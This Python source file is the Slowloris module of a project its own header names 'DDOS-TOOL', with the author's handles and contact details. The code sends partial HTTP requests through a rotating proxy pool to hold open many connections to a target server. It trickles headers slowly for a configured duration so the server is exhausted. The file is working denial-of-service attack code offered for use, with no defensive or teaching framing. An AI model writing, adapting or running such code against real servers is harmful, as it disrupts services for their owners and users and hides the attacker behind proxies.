"""
DDOS-TOOL

Author / Developer / Admin / Owner: Aashu
GitHub:  @outwiles
Telegram: @outwiles
Email:   outwiles@proton.me

License: MIT
"""

import asyncio
import random

from aiohttp_socks import ProxyConnector

from ..utils.headers import build_headers


class Slowloris:
    def __init__(self, cfg: dict, pool, logger):
        self.cfg = cfg
        self.pool = pool
        self.logger = logger
        self._stop = False

    async def _conn(self, target: dict):
        while not self._stop:
            proxy = await self.pool.acquire()
            if proxy is None:
                await asyncio.sleep(1)
                continue

            hostport = target["url"].split("//", 1)[1].split("/", 1)[0]
            host, _, port_s = hostport.partition(":")
            port = int(port_s) if port_s else (443 if target["url"].startswith("https") else 80)

            try:
                connector = ProxyConnector.from_url(proxy.url, rdns=True)
                reader, writer = await asyncio.wait_for(
                    connector.connect(("http" if port == 80 else "https", host, port)),
                    timeout=10,
                )

                writer.write(f"GET /?{random.randint(1, 10**9)} HTTP/1.1\r\n".encode())
                await writer.drain()

                headers = build_headers(target.get("type", "http"), host=host)
                for k, v in headers.items():
                    writer.write(f"{k}: {v}\r\n".encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(1.0, 5.0))

                for _ in range(60):
                    if self._stop:
                        break
                    writer.write(f"X-Keep-{random.randint(1, 10**6)}: 1\r\n".encode())
                    await writer.drain()
                    await asyncio.sleep(random.uniform(3.0, 8.0))

                writer.close()
            except Exception:
                await self.pool.report(proxy, ok=False)
                continue

            await self.pool.report(proxy, ok=True)

    async def run(self, target: dict) -> dict:
        n = self.cfg["attack"]["concurrency"]
        tasks = [asyncio.create_task(self._conn(target)) for _ in range(n)]
        await asyncio.sleep(self.cfg["attack"]["duration_sec"])
        self._stop = True
        for t in tasks:
            t.cancel()
        return {"connections": n}
